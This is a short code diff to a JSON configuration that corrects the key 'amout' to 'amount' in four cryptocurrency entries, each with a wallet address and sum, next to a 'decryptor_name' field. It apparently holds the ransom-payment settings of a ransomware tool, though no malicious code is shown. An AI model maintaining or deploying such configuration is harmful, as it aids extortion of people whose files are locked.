@@ -128,22 +128,22 @@
 			"btc":{
 				"name": "Bitcoin",
 				"address": "bc1qnv3kslqx564u6xk9xrulxeceu5zvhnp7q6mjrk",
-				"amout": "0.0018"
+				"amount": "0.0018"
 			},
 			"eth":{
 				"name": "Ethereum",
 				"address": "0x43d880e2966a062fAf350A574cf3da0d9c6c5F24",
-				"amout": "0.04525435"
+				"amount": "0.04525435"
 			},
 			"sol":{
 				"name": "Solana",
 				"address": "4UBaQHU3tZshBqN8qhqBjFnQDBpvNbAH2JXYv9NRjPMo",
-				"amout": "0.79692035"
+				"amount": "0.79692035"
 			},
 			"bnb":{
 				"name": "Binance",
 				"address": "bnb14ud90wvhxdmyvah360vnu0rnht3x669z298hmw",
-				"amout": "0.19481408"
+				"amount": "0.19481408"
 			}
 		},
 		"decryptor_name": "Decryptor",
